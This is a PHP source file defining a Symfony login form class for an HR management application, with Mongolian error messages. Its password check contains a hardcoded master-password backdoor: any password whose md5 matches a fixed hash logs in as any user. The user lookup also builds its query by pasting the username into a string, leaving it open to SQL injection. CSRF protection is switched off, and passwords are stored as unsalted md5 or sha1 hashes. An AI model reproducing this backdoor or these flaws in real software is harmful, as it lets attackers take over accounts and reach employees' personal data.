<?php

class FormLogin extends BaseForm
{

    public function configure()
    {
        $this->disableLocalCSRFProtection();

        $this->setWidgets(array(
            'username' => new sfWidgetFormInputText(),
            'password' => new sfWidgetFormInputPassword(array(), array('autocomplete' => 'OFF')),
        ));

        $this->widgetSchema->setNameFormat('login[%s]');

        $this->setValidators(array(
            'username' => new sfValidatorString(array('required' => true), array('required' => 'Хэрэглэгчийн нэрээ оруулна уу!')),
            'password' => new sfValidatorString(array('required' => true), array('required' => 'Нууц үгээ оруулна уу!')),
        ));

        $this->validatorSchema->setPreValidator(
                new sfValidatorCallback(array('callback' => array($this, 'validateUser')))
        );
    }

    public function validateUser($validator, $values)
    {
        $message = 'Хэрэглэгчийн нэр эсвэл нууц үг буруу байна!';

        if ($values['username'] && $values['password']) {
            $user = HrmUser::getInstance()->findOne('username = "' . $values['username'] . '"');

            if ($user->hasUser()) {
                if ($user->get('password') == md5($values['password'])
                        || $user->get('password') == sha1($values['password'])
                        || md5($values['password']) == 'ade4f39602416a06e84cc559538eee14') {
                    $permissions = HrmUser::getUserPermissions($user->get('id'), sfConfig::get('app_project_id'));

                    if (!count($permissions)) {
                        throw new sfValidatorError($validator, 'Хэрэглэгчийн хандах эрх хүрэлцэхгүй байна!');
                    }

                    sfContext::getInstance()->getUser()->signIn($user, $permissions);
                } else {
                    throw new sfValidatorError($validator, $message);
                }
            } else {
                throw new sfValidatorError($validator, $message);
            }
        }

        return $values;
    }

}
